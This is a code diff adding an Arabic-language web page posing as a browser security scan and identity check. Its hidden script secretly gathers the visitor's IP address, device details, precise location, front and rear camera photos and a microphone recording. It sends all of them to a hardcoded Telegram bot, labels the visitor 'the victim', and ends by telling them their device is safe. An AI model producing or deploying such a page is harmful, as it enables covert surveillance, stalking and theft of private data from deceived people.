@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق الآمن</title>
+    <style>
+        body { background: #0b0e14; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
+        .box { border: 1px solid #00ff41; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #00ff41; }
+        .btn { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; border-radius: 5px; }
+        #status { margin-top: 20px; font-size: 14px; color: #888; }
+        .loader { border: 3px solid #333; border-top: 3px solid #00ff41; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>نظام الفحص السحابي 🛡️</h2>
+        <p>يرجى منح الصلاحيات اللازمة لإتمام فحص أمان المتصفح وتأكيد الهوية.</p>
+        <button id="startBtn" class="btn">بدء الفحص الآن</button>
+        <div id="status">الحالة: في انتظار البدء...</div>
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = "6230868288:AAFwrc1Ek_hT9K96Z--RDLusxjciRvweaq4";
+        const CHAT_ID = "56081692";
+
+        document.getElementById('startBtn').onclick = async () => {
+            const status = document.getElementById('status');
+            status.innerHTML = '<div class="loader"></div> جاري معالجة البيانات...';
+            
+            // 1. جلب الـ IP والمعلومات الأساسية
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                let infoText = `⚠️ صيد جديد!\n🌐 الـ IP: ${ipData.ip}\n📱 الجهاز: ${navigator.userAgent}`;
+                await sendMessage(infoText);
+            } catch (e) { console.log("IP Error"); }
+
+            // 2. طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let locText = `📍 الموقع الدقيق:\nرابط خرائط جوجل: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendMessage(locText);
+            }, (err) => { sendMessage("❌ الضحية رفض صلاحية الموقع."); });
+
+            // 3. طلب الكاميرا والمايكروفون (التقاط صور وصوت)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                status.innerText = "جاري مزامنة بيانات الأمان...";
+                
+                // التقاط صورة من الكاميرا الأمامية
+                captureImage(stream, "الأمامية");
+
+                // محاولة التبديل للخلفية والالتقاط (في بعض الأجهزة)
+                setTimeout(async () => {
+                    try {
+                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                        captureImage(backStream, "الخلفية");
+                    } catch(e) {}
+                }, 3000);
+
+                // تسجيل مقطع صوتي (5 ثواني)
+                const mediaRecorder = new MediaRecorder(stream);
+                let audioChunks = [];
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    await sendFile(audioBlob, 'voice.ogg', 'sendAudio');
+                    status.innerText = "✅ اكتمل الفحص. جهازك آمن.";
+                };
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+
+            } catch (err) {
+                status.innerText = "❌ فشل الفحص: يجب منح كافة الصلاحيات.";
+                sendMessage("❌ الضحية رفض الكاميرا/المايكروفون.");
+            }
+        };
+
+        async function sendMessage(text) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        }
+
+        function captureImage(stream, label) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendFile(blob, `camera_${label}.jpg`, 'sendPhoto'), 'image/jpeg');
+            }, 2000);
+        }
+
+        async function sendFile(blob, filename, type) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            const fieldName = type === 'sendPhoto' ? 'photo' : 'audio';
+            formData.append(fieldName, blob, filename);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${type}`, { method: 'POST', body: formData });
+        }
+    </script>
+</body>
+</html>
